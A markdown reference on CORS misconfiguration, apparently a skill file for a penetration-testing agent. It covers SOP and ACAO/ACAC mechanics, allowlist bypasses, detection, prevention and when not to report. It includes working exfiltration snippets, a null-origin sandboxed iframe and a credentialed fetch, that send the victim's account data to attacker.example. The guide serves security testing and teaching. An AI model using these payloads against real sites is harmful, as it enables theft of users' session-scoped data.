# CORS Misconfiguration — Deep Reference

Primary source: https://portswigger.net/web-security/cors

This document expands the `cors` SKILL. Goal: prove **cross-origin theft of sensitive, session-scoped data**. Anything short of that is usually not reportable — see "When CORS is NOT a finding" at the bottom.

---

## 1. Same-Origin Policy (SOP) recap
SOP restricts how a document/script loaded from one origin can interact with a resource from another origin. An **origin** = scheme + host + port (e.g. `https://app.example:443`). By default, a page on origin A can *send* a request to origin B (with the victim's cookies, if not blocked by other policies) but **cannot read the response** unless B explicitly opts in via CORS. CORS is a controlled relaxation of SOP — and the relaxation is exactly what gets misconfigured.

Important: CORS controls *who can read the response in a browser*, not whether the request is sent or whether the server processes it. CORS is **never** a substitute for server-side authz on sensitive data.

## 2. ACAO / ACAC mechanics
- `Access-Control-Allow-Origin` (ACAO): which origin(s) may read the response. Either a single explicit origin, or `*`.
- `Access-Control-Allow-Credentials` (ACAC): `true` allows the cross-origin response to be read when the request was made **with credentials** (cookies, HTTP auth, client certs), i.e. `fetch(..., {credentials:'include'})` / `xhr.withCredentials = true`.

Browser-enforced rules that matter for triage:
- **`ACAO: *` cannot be combined with credentials.** If the request is credentialed, the browser requires ACAO to be a specific origin echoing the request's `Origin`; a `*` response is rejected and the page cannot read it. This is *why* `ACAO: *` alone is usually noise.
- Because a server can only name **one** origin in ACAO, many apps implement a dynamic check: read the request `Origin`, decide if it's allowed, and **reflect it back**. The vulnerability lives in that decision logic.
- For a credentialed cross-origin read to succeed, the response needs BOTH `ACAO: <attacker origin>` AND `ACAC: true`.

## 3. Vulnerability types

### 3.1 Server reflects the Origin header (with credentials)
The server takes the incoming `Origin` and copies it into ACAO, and also returns `ACAC: true`, without validating it. Any attacker origin is trusted.
- Test: `Origin: https://evil.example` -> response `ACAO: https://evil.example`, `ACAC: true`.
- Impact: full cross-origin theft of the endpoint's authenticated response. **HIGH** if the body is sensitive.

### 3.2 Errors parsing Origin / whitelist regex flaws
The app maintains an allowlist but matches it incorrectly:
- **Suffix match**: allowlist contains `target.com`, code does `origin.endsWith("target.com")` -> `https://eviltarget.com` passes.
- **Prefix match**: code does `origin.startsWith("https://target.com")` -> `https://target.com.evil.example` passes.
- **Substring / `includes`**: `https://evil.example/target.com` or `https://target.com.evil.example` passes.
- **Unescaped dot in regex**: `target.com` as regex matches `targetXcom` -> attacker registers `targetxcom`.
- **Trust-any-subdomain**: `*.target.com` trusted -> pivot via XSS on any subdomain (see 3.4) or via a subdomain takeover.
Test each mutation and confirm reflection + `ACAC: true`.

### 3.3 Whitelisted `null` origin
Browsers send `Origin: null` in several cases: sandboxed iframes, `data:` URLs, cross-origin redirects, `file:` documents. Developers sometimes allowlist `null` for local/dev convenience. If `ACAO: null` + `ACAC: true` is returned, an attacker forces a `null` origin from a sandboxed iframe and reads the response.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
  var req = new XMLHttpRequest();
  req.onload = function(){ location='https://attacker.example/log?d='+encodeURIComponent(this.responseText); };
  req.open('GET','https://target.example/api/account',true);
  req.withCredentials = true;
  req.send();
</script>"></iframe>
```

### 3.4 Exploiting via XSS on a trusted origin
If the allowlist trusts a sibling/subdomain (e.g. `sub.target.com`) and that origin has an XSS, inject the CORS-exfil JS there. The request now originates from a *whitelisted* origin, so reflection is legitimate and the steal succeeds. Lesson: a trusted origin's XSS becomes a data-theft vector against the API. Chain value is high.

### 3.5 Breaking TLS with a trusted internal/HTTP origin
App is HTTPS but allowlists an `http://` internal origin (e.g. `http://stage.target.com`). A network-positioned (MITM) attacker intercepts a victim's plaintext HTTP request to that origin, injects a redirect/script to the HTTPS API, and reads the response — the API trusts the HTTP origin. Demonstrates that trusting any non-HTTPS origin undermines TLS. Report only with a realistic MITM position and a sensitive target.

### 3.6 Intranet / no-credentials wildcard
Internal apps with `ACAO: *` and **no** credentials can still be abused when an internal user browses an attacker page: the page uses the victim's browser as a proxy to reach intranet resources and read responses (since `*` allows reading non-credentialed responses). Impact depends on whether the intranet resource leaks sensitive data without auth. Often lower signal — qualify carefully.

## 4. Exploitation walkthroughs

### A. Reflected origin + credentials (the canonical case)
1. Confirm with curl that `ACAO` reflects an arbitrary origin and `ACAC: true` is present, using a valid session cookie.
2. Host this on an attacker origin:
```html
<script>
fetch('https://target.example/api/account', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://attacker.example/log', { method:'POST', body:d }));
</script>
```
3. Victim (logged in) visits -> their account data is exfiltrated. Capture proof to `./_EXPLOIT/`.

### B. null origin
Use the sandboxed iframe in 3.3. Same proof requirements.

### C. Whitelist bypass
Find the working mutation from 3.2, then run walkthrough A using that origin (you must control a domain matching the bypass, e.g. register `eviltarget.com`).

## 5. Detection checklist
- Send arbitrary `Origin`; check ACAO reflection + ACAC.
- Send `Origin: null`; check acceptance.
- Mutate the allowed origin (prefix/suffix/substring/subdomain/dot) and recheck.
- Confirm the endpoint returns sensitive, session-bound data and that the request works with cookies.
- Confirm a browser would actually honor it (credentialed read needs specific-origin ACAO, not `*`).

## 6. Prevention
- Maintain an **exact-match** allowlist of trusted origins; compare full strings, never prefix/suffix/substring.
- Never reflect an unvalidated `Origin`.
- Never return `ACAO: null`.
- Avoid `ACAO: *` for anything sensitive; never pair wildcard intent with credentials.
- Only trust HTTPS origins; avoid wildcards on internal networks.
- Keep robust server-side authentication/authorization regardless of CORS — CORS is not access control.

## 7. When CORS is NOT a finding (read before reporting)
- `ACAO: *` with **no** `ACAC` and **no** sensitive data — by design; browsers won't leak credentialed data.
- Reflection on **public/unauthenticated/static** endpoints — nothing sensitive to steal.
- Reflection where you **cannot** demonstrate reading sensitive victim data cross-origin (theoretical only).
- Endpoints that require a custom header / bearer token the attacker page cannot supply cross-origin (preflight blocks it; no cookie-based session to ride).
- `ACAO: *` plus `ACAC: true` in the raw response — browsers reject this combination for credentialed reads, so it is not directly exploitable for credentialed theft.

If you cannot show actual exfiltration of sensitive, session-scoped data to an attacker origin, do not file it.
